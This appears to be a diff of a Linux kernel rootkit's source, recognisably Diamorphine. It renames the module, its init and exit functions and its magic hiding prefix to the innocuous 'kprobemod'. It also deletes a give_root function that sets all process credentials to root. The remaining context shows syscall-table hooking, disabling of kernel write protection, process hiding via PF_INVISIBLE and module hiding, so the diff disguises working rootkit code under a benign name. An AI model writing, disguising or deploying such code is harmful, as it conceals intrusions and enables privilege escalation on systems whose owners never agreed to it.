@@ -12,11 +12,11 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define MAGIC_PREFIX "diamorphine_secret"
+#define MAGIC_PREFIX "kprobemod_secret"
 
 #define PF_INVISIBLE 0x10000000
 
-#define MODULE_NAME "diamorphine"
+#define MODULE_NAME "kprobemod"
 
 enum {
 	SIGINVIS = 31,
@@ -61,7 +61,7 @@ static struct kprobe kp = {
 #define __NR_getdents 141
 #endif
 
-// #include "diamorphine.h"
+// #include "kprobemod.h"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
@@ -276,36 +276,6 @@ out:
 	return ret;
 }
 
-void
-give_root(void)
-{
-	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
-		current->uid = current->gid = 0;
-		current->euid = current->egid = 0;
-		current->suid = current->sgid = 0;
-		current->fsuid = current->fsgid = 0;
-	#else
-		struct cred *newcreds;
-		newcreds = prepare_creds();
-		if (newcreds == NULL)
-			return;
-		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
-			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
-			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
-			newcreds->uid.val = newcreds->gid.val = 0;
-			newcreds->euid.val = newcreds->egid.val = 0;
-			newcreds->suid.val = newcreds->sgid.val = 0;
-			newcreds->fsuid.val = newcreds->fsgid.val = 0;
-		#else
-			newcreds->uid = newcreds->gid = 0;
-			newcreds->euid = newcreds->egid = 0;
-			newcreds->suid = newcreds->sgid = 0;
-			newcreds->fsuid = newcreds->fsgid = 0;
-		#endif
-		commit_creds(newcreds);
-	#endif
-}
-
 static inline void
 tidy(void)
 {
@@ -352,9 +322,6 @@ hacked_kill(pid_t pid, int sig)
 			if ((task = find_task(pid)) == NULL)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
-			break;
-		case SIGSUPER:
-			give_root();
 			break;
 		case SIGMODINVIS:
 			if (module_hidden) module_show();
@@ -414,7 +381,7 @@ unprotect_memory(void)
 }
 
 static int __init
-diamorphine_init(void)
+kprobemod_init(void)
 {
 	__sys_call_table = get_syscall_table_bf();
 	if (!__sys_call_table)
@@ -453,7 +420,7 @@ diamorphine_init(void)
 }
 
 static void __exit
-diamorphine_cleanup(void)
+kprobemod_cleanup(void)
 {
 	unprotect_memory();
 
@@ -464,8 +431,8 @@ diamorphine_cleanup(void)
 	protect_memory();
 }
 
-module_init(diamorphine_init);
-module_exit(diamorphine_cleanup);
+module_init(kprobemod_init);
+module_exit(kprobemod_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("m0nad");
